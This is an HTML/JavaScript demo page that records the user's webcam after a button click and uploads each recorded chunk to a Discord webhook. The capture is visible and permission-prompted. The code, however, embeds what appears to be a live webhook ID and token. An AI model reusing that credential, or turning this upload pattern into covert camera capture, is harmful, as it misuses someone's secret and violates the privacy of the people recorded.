<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-time Video Recording with Webhook</title>
</head>
<body>
    <video id="video" autoplay></video>
    <button id="start-recording">Start Recording</button>
    <button id="stop-recording">Stop Recording</button>

    <script>
        const video = document.getElementById('video');
        const startRecordingButton = document.getElementById('start-recording');
        const stopRecordingButton = document.getElementById('stop-recording');

        let recorder;

        startRecordingButton.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    recorder = new MediaRecorder(stream);
                    recorder.ondataavailable = (e) => {
                        const blob = new Blob([e.data], { type: 'video/webm' });
                        sendVideoToWebhook(blob);
                    };
                    recorder.start();
                    startRecordingButton.disabled = true;
                    stopRecordingButton.disabled = false;
                })
                .catch(error => {
                    console.error(error);
                });
        });

        stopRecordingButton.addEventListener('click', () => {
            recorder.stop();
            video.srcObject = null;
            startRecordingButton.disabled = false;
            stopRecordingButton.disabled = true;
        });

        const sendVideoToWebhook = (blob) => {
            // Replace the following with your actual webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1183018311831781417/QteUjfAxanIeiMrWvXyzzQDSf3pqq23E9HvukaJrKFZ4-UH9k_N8Vk2aUPMuqWlRnpqP';
            const formData = new FormData();
            formData.append('video', blob, 'video.webm');

            fetch(webhookUrl, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                console.log('Video sent to webhook successfully:', data);
            })
            .catch(error => {
                console.error(error);
            });
        };
    </script>
</body>
</html>
